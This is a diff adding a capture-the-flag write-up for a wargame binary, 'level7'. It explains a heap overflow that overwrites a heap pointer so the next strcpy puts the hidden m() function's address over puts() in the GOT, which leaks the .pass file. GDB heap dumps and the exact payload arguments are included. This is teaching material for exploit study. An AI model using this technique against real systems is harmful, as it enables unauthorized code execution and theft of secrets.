@@ -2,3 +2,64 @@
 
 The binary here creates two arrays of two int32_t each, arr1 and arr2. The first element is stored on the stack with the value 1 and 2 respectively, then the second element is allocated with malloc(8), which is enough to store an address/a pointer.
 
+There is a ghost function in the program again, `m()`:
+
+```c
+int m() // 0x080484f4
+{
+    return printf("%s - %d\n", &str, time(NULL));
+}
+```
+
+This functions will be useful to print the content of the global string used as buffer to load the content of the file `.pass`.
+
+In case we execute the program with normal arguments, the program will read the content but then it will call the `puts()` function with a static string that is not useful here. For the exploit, we need to redirect the execution to call `m()` instead.
+
+To do so, we have to overflow the heap. Using GDB, we can dump it like so:
+
+```bash
+Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
+(gdb) info proc mappings
+process 2931
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/user/level7/level7
+         0x8049000  0x804a000     0x1000        0x0 /home/user/level7/level7
+         0x804a000  0x806b000    0x21000        0x0 [heap]
+         ...
+
+(gdb) b fgets
+Breakpoint 1 at 0xb7e90b70
+(gdb) run AAAAAAAA BBBBBBBB
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level7/level7 AAAAAAAA BBBBBBBB
+
+Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/16wx 0x804a000
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018 <
+0x804a010:      0x00000000      0x00000011      0x41414141 <    0x41414141
+0x804a020:      0x00000000      0x00000011      0x00000002      0x0804a038 <
+0x804a030:      0x00000000      0x00000011      0x42424242 <    0x42424242
+
+```
+
+Here we can see exactly where our two strings are saved. It is interesting to note that malloc not only maps the available allocations, it also uses the space to save a header that contains the exact address of the buffer.
+
+This means that we can overwrite the pointer of the second array with the GOT address of `puts()`, so that the second `strcpy()` will write there. If we pass the address of the `m()` function, then we can effectively make the program call `m()` instead of `puts()`.
+
+This is what the heap looks like with the correct payload:
+
+```bash
+Starting program: /home/user/level7/level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+
+Breakpoint 1, 0xb7e90b70 in fgets () from /lib/i386-linux-gnu/libc.so.6
+(gdb) x/24wx 0x804a000
+0x804a000:      0x00000000      0x00000011      0x00000001      0x0804a018
+0x804a010:      0x00000000      0x00000011      0x41414141      0x41414141
+0x804a020:      0x41414141      0x41414141      0x41414141      0x08049928 <
+(gdb) x/w 0x08049928
+0x8049928 <puts@got.plt>:       0x080484f4 < // This is now the pointer to m(), not puts()
+```
